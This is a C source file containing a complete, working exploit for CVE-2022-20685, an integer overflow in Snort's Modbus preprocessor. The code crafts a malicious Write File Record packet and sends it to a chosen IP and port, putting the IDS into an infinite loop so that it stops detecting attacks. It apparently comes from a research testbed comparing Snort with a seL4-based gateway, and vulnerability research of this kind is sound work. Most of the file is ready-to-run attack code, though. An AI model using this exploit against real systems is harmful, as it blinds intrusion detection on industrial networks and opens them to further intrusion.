/*
 * CVE-2022-20685 Exploit - Snort Modbus Preprocessor Integer Overflow
 *
 * This exploits an integer overflow in Snort's Modbus preprocessor that
 * causes an infinite loop, effectively "blinding" the IDS.
 *
 * Vulnerability Details:
 * - Location: ModbusCheckRequestLengths() in modbus_decode.c
 * - Trigger: Write File Record (function code 0x15) with record_length=0xFFFE
 * - Effect: bytes_processed = 7 + (2 * 0xFFFE) = 0x20003 overflows uint16_t
 *           Result: 0x20003 & 0xFFFF = 3, loop condition always true
 *
 * Affected Versions:
 * - Snort < 2.9.19
 * - Snort 3 < 3.1.11.0
 *
 * Compile: gcc -o cve_20685_attack cve_20685_attack.c
 * Usage:   ./cve_20685_attack <IP> <PORT>
 *
 * For defensive security research only.
 *
 * References:
 * - https://claroty.com/team82/research/blinding-snort-breaking-the-modbus-ot-preprocessor
 * - https://nvd.nist.gov/vuln/detail/CVE-2022-20685
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

/*
 * Modbus Write File Record (0x15) PDU structure:
 *
 * Byte 0:      Function code (0x15)
 * Byte 1:      Request data length
 * Byte 2:      Reference type (0x06)
 * Bytes 3-4:   File number
 * Bytes 5-6:   Record number
 * Bytes 7-8:   Record length  <-- SET TO 0xFFFE TO TRIGGER OVERFLOW
 * Bytes 9+:    Record data (2 * record_length bytes)
 *
 * The vulnerable code does:
 *   bytes_processed = 7 + (2 * record_length);
 *
 * When record_length = 0xFFFE:
 *   bytes_processed = 7 + (2 * 0xFFFE) = 7 + 0x1FFFC = 0x20003
 *
 * But bytes_processed is uint16_t (max 65535 = 0xFFFF):
 *   0x20003 & 0xFFFF = 0x0003
 *
 * The while loop condition is: bytes_processed < tmp_count
 * Since bytes_processed (3) < tmp_count, loop continues forever!
 */

/* Trigger value that causes integer overflow */
#define TRIGGER_RECORD_LENGTH 0xFFFE

static void print_usage(const char *prog) {
    printf("CVE-2022-20685 Exploit - Snort Modbus Preprocessor DoS\n\n");
    printf("Usage: %s <IP> <PORT>\n\n", prog);
    printf("This exploit causes Snort's Modbus preprocessor to enter an\n");
    printf("infinite loop, effectively blinding the IDS to all attacks.\n\n");
    printf("Examples:\n");
    printf("  %s 127.0.0.1 503     # Attack Snort gateway via Docker\n", prog);
    printf("  %s 192.168.96.20 502 # Attack Snort directly\n", prog);
}

static int tcp_connect(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        fprintf(stderr, "Invalid IP address: %s\n", ip);
        close(sock);
        return -1;
    }

    /* Set connection timeout */
    struct timeval tv = {10, 0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

static void build_cve_20685_packet(uint8_t *packet, size_t *len) {
    /*
     * CVE-2022-20685 Exploit Packet
     *
     * The vulnerability is in ModbusCheckRequestLengths() at modbus_decode.c:187-228.
     * After reading record_length, the code calculates:
     *     bytes_processed += 7 + (2 * record_length);
     *
     * This can overflow uint16_t. The next read uses bytes_processed as offset:
     *     record_length = *(payload + bytes_processed + 5);
     *
     * CRITICAL INSIGHT: After overflow, we read from a DIFFERENT offset!
     *
     * Attack sequence:
     * 1. bytes_processed = 0, read from offset 5 → record_length = 0xFFFE
     *    bytes_processed = 0 + 7 + 2*0xFFFE = 0x20003 → overflows to 3
     *
     * 2. bytes_processed = 3, read from offset 8 → record_length = 0xFFFB
     *    bytes_processed = 3 + 7 + 2*0xFFFB = 0x20000 → overflows to 0
     *
     * 3. bytes_processed = 0 again → INFINITE LOOP (oscillates 0 → 3 → 0 → ...)
     *
     * Packet structure (sub-request data, 14 bytes):
     *   Offset 0:   0x06 (ref_type - required for validation)
     *   Offset 1-4: padding
     *   Offset 5-6: 0xFFFE (record_length for first read)
     *   Offset 7:   padding
     *   Offset 8-9: 0xFFFB (record_length for second read after overflow)
     *   Offset 10-13: padding
     */
    size_t idx = 0;

    /* MBAP Header (7 bytes) */
    packet[idx++] = 0x00;  /* Transaction ID high */
    packet[idx++] = 0x01;  /* Transaction ID low */
    packet[idx++] = 0x00;  /* Protocol ID high (Modbus) */
    packet[idx++] = 0x00;  /* Protocol ID low */
    packet[idx++] = 0x00;  /* Length high */
    packet[idx++] = 0x11;  /* Length low = 17 (Unit ID + PDU) */
    packet[idx++] = 0x01;  /* Unit ID */

    /* PDU: Write File Record (Function 0x15) */
    packet[idx++] = 0x15;  /* Function code */
    packet[idx++] = 0x0E;  /* Request data length = 14 bytes */

    /* Sub-request data (14 bytes) - crafted for offset exploitation */
    packet[idx++] = 0x06;  /* Offset 0: Reference type (required) */
    packet[idx++] = 0x00;  /* Offset 1: padding */
    packet[idx++] = 0x00;  /* Offset 2: padding */
    packet[idx++] = 0x00;  /* Offset 3: padding */
    packet[idx++] = 0x00;  /* Offset 4: padding */
    packet[idx++] = 0xFF;  /* Offset 5: record_length HIGH (0xFFFE) - first read */
    packet[idx++] = 0xFE;  /* Offset 6: record_length LOW */
    packet[idx++] = 0x00;  /* Offset 7: padding */
    packet[idx++] = 0xFF;  /* Offset 8: record_length HIGH (0xFFFB) - second read */
    packet[idx++] = 0xFB;  /* Offset 9: record_length LOW */
    packet[idx++] = 0x00;  /* Offset 10: padding */
    packet[idx++] = 0x00;  /* Offset 11: padding */
    packet[idx++] = 0x00;  /* Offset 12: padding */
    packet[idx++] = 0x00;  /* Offset 13: padding */

    *len = idx;
}

static void print_packet_analysis(void) {
    printf("\n");
    printf("┌──────────────────────────────────────┐\n");
    printf("│ CVE-2022-20685: Integer Overflow     │\n");
    printf("├──────────────────────────────────────┤\n");
    printf("│ Vulnerable Code:                     │\n");
    printf("│  uint16_t bytes_processed;           │\n");
    printf("│  while (bytes_processed < tmp) {     │\n");
    printf("│    bytes_processed =                 │\n");
    printf("│      7 + (2 * record_length); //BUG  │\n");
    printf("│  }                                   │\n");
    printf("├──────────────────────────────────────┤\n");
    printf("│ Attack: record_length = 0x%04X     │\n", TRIGGER_RECORD_LENGTH);
    printf("│                                      │\n");
    printf("│ Calculation:                         │\n");
    printf("│  7 + (2 * 0x%04X) = 0x20003        │\n", TRIGGER_RECORD_LENGTH);
    printf("│                                      │\n");
    printf("│ Overflow (uint16_t max=0xFFFF):      │\n");
    printf("│  0x20003 & 0xFFFF = 0x0003           │\n");
    printf("│                                      │\n");
    printf("│ Result: bytes_processed = 3          │\n");
    printf("│  Loop always TRUE → INFINITE LOOP   │\n");
    printf("│  → Snort hangs → IDS BLIND          │\n");
    printf("└──────────────────────────────────────┘\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Invalid port: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    printf("╔══════════════════════════════════════╗\n");
    printf("║ CVE-2022-20685: Snort DoS           ║\n");
    printf("║ Affects: Snort < 2.9.19             ║\n");
    printf("║ Impact: IDS Denial of Service       ║\n");
    printf("╚══════════════════════════════════════╝\n");
    printf("\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);

    print_packet_analysis();

    /* Build exploit packet */
    uint8_t packet[64];
    size_t packet_len;
    build_cve_20685_packet(packet, &packet_len);

    printf("[*] Packet contents (%zu bytes):\n    ", packet_len);
    for (size_t i = 0; i < packet_len; i++) {
        printf("%02X ", packet[i]);
        if ((i + 1) % 16 == 0 && i + 1 < packet_len) printf("\n    ");
    }
    printf("\n\n");

    /* Connect to target */
    printf("[1] Connecting to target...\n");
    int sock = tcp_connect(target_ip, target_port);
    if (sock < 0) {
        return EXIT_FAILURE;
    }
    printf("    Connected!\n\n");

    /* Send exploit */
    printf("[2] Sending CVE-2022-20685 exploit packet...\n");
    ssize_t sent = send(sock, packet, packet_len, 0);
    if (sent < 0) {
        perror("send");
        close(sock);
        return EXIT_FAILURE;
    }
    printf("    Sent %zd bytes!\n\n", sent);

    /* Brief wait */
    usleep(500000);  /* 500ms */

    printf("[3] Exploit delivered.\n\n");

    printf("╔══════════════════════════════════════╗\n");
    printf("║ RESULT                               ║\n");
    printf("╠══════════════════════════════════════╣\n");
    printf("║ If Snort vulnerable (< 2.9.19):      ║\n");
    printf("║  • Preprocessor in infinite loop    ║\n");
    printf("║  • No more packets processed        ║\n");
    printf("║  • IDS is BLIND to all attacks      ║\n");
    printf("║                                      ║\n");
    printf("║ Verify by:                           ║\n");
    printf("║  1. Check CPU (should be 100%%)      ║\n");
    printf("║  2. Send CVE-14462 - no alert       ║\n");
    printf("║  3. Compare with seL4 (works)       ║\n");
    printf("╠══════════════════════════════════════╣\n");
    printf("║ seL4 is IMMUNE because:              ║\n");
    printf("║  • No Modbus preprocessor           ║\n");
    printf("║  • Simple length validation         ║\n");
    printf("║  • Protocol-break architecture      ║\n");
    printf("║  • ~1000 LoC vs ~500k LoC          ║\n");
    printf("╚══════════════════════════════════════╝\n");

    close(sock);
    return EXIT_SUCCESS;
}
